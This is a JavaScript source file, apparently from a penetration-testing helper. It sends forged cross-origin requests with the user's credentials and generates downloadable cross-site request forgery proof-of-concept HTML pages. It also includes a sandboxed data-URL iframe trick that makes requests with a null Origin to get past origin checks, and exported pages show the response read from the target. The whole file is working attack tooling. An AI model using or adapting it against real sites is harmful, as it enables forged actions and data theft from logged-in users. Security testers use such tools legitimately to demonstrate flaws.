document.addEventListener('DOMContentLoaded', function() {
    var $ = function(id) {
        return document.getElementById(id);
    };

    var output = $('console');
    var scroll = $('scroll');

    var log = function(line) {
        if (console) {
            console.log.apply(null, arguments);
        }
        output.innerText += line + '\n';
        scroll.scrollIntoView(false);
    };

    var hasBody = $('has-body');
    (function() {
        var x = function() {
            $('body-container').hidden = !hasBody.checked;
        };
        x();
        hasBody.addEventListener('change', x);
    })();

    var csrf = function(cfg, done, log) {
        done = done || function() {};
        log = log || function() {};

        var method = cfg.method;
        var url = cfg.url;

        if(cfg.nullOrigin) {
            cfg.nullOrigin = false;

            var fileContent = exportToHtml(generatePayload(csrf, cfg, function(x) {
                window.top.postMessage(['done', x], '*');
            }, function(x) {
                window.top.postMessage(['log', x], '*');
            }));

            var msgHandler = function(msg) {
                var op = msg.data[0];
                var data = msg.data[1];

                if(op == 'log') {
                    log(data);
                } else if(op == 'done') {
                    window.removeEventListener('message', msgHandler, false);
                    document.body.removeChild(iframe);
                    done(data);
                }
            };
            window.addEventListener('message', msgHandler, false);

            log('[*] respawning inside iframe');
            var iframe = document.createElement('iframe');
            iframe.hidden = true;
            iframe.sandbox = 'allow-scripts allow-top-navigation allow-forms allow-same-origin';
            iframe.src = exportToUrl(fileContent);

            document.body.append(iframe);

            return;
        }

        log(`[*] ${method} ${url}`, xhr);

        var xhr = new XMLHttpRequest();
        xhr.addEventListener('readystatechange', function(e) {
            if(xhr.readyState == 1) {
                log('[+] opened', xhr);
            } else if(xhr.readyState == 2) {
                log(`[+] headers received: ${xhr.status} ${xhr.statusText}`, xhr);
            } else if(xhr.readyState == 3) {
                log(`[+] loading: ${xhr.status} ${xhr.statusText}`, xhr);
            } else {
                // readyState == 4
                log(`[+] done: ${xhr.status} ${xhr.statusText}`, xhr);
                done(xhr.responseText);
            }
        });

        xhr.addEventListener('error', function(e) {
            log(`[!] error: ${e}`, e);
        });

        xhr.addEventListener('abort', function(e) {
            log(e);
        });

        xhr.open(method, url, true);
        xhr.withCredentials = cfg.withCredentials || false;
        if(cfg.contentType) {
            xhr.setRequestHeader('Content-Type', cfg.contentType);
        }
        xhr.send(cfg.body || null);
    };

    var generateConfig = function() {
        var cfg = {};
        cfg.method = form['method'].value;
        cfg.url = form['url'].value;

        if(form['withCredentials'].checked) {
            cfg.withCredentials = true;
        }

        if(form['null-origin'].checked) {
            cfg.nullOrigin = true;
        }

        if (hasBody.checked) {
            var contentType = form['content-type'].value;
            if(contentType) {
                cfg.contentType = contentType;
            }
            cfg.body = form['body'].value;
        }

        return cfg;
    };

    var form = document.forms.form;
    $('form').addEventListener('submit', function(e) {
        e.preventDefault();

        csrf(generateConfig(), function(response) {
            try {
                response = JSON.parse(response);
            } catch(e) {
                // ignore
            }

            log(JSON.stringify(response, null, 4));
        }, log);
    });

    var uglify = function(func) {
        return (func + '').split('\n')
            .map(function(x) { return x.trimLeft() })
            .filter(function(x) {
                if(x.startsWith('//')) return false;
                return x;
            })
            .join(' ');
    };

    var generatePayload = function(func, cfg, done, log) {
        var code = uglify(func);
        var payload = JSON.stringify(cfg, null, 4);

        done = (done || 'null') + '';
        log = (log || 'null') + '';

        return '(' + code + ')(' + payload + ', ' + done + ', ' + log + ')';
    };

    var exportToHtml = function(code) {
        return '<meta charset="utf-8">\n<body><script>\n' + code + ';\n</scri' + 'pt></body>\n';
    };

    var exportToUrl = function(fileContent) {
        return 'data:text/html;charset=utf-8,' + encodeURIComponent(fileContent);
    }

    var packFunctions = function(funcs) {
        return funcs.map(function(x) {
            return 'var ' + x[0] + ' = ' + uglify(x[1]) + ';';
        }).join('');
    }

    var generateFilename = function(target) {
        var url = new URL(target);

        var pathinfo = url.pathname.substring(1);
        if(pathinfo.length) {
            pathinfo = pathinfo.replace(/\//g, '_');
            pathinfo = '-' + pathinfo;
        }

        return 'csrf-' +
            (new Date().toISOString().substring(0, 10)) + '-' +
            url.hostname + pathinfo + '.html';
    };

    $('export').addEventListener('click', function(e) {
        if(!form.reportValidity()) {
            e.preventDefault();
            return;
        }

        var cfg = generateConfig();
        var payload;
        var done = 'function(x) {\n    alert(x);\n}';

        if(cfg.nullOrigin) {
            // adding utilities
            payload = '(function(){' + packFunctions([
                ['uglify', uglify],
                ['generatePayload', generatePayload],
                ['exportToHtml', exportToHtml],
                ['exportToUrl', exportToUrl],
                ['csrf', csrf],
            ]) + generatePayload('csrf', cfg, done) + '})()';
        } else {
            payload = generatePayload(csrf, cfg, done);
        }

        var fileContent = exportToHtml(payload);
        log(fileContent, cfg);

        $('export').setAttribute('href', exportToUrl(fileContent));
        $('export').setAttribute('download', generateFilename(cfg.url));
    });
});
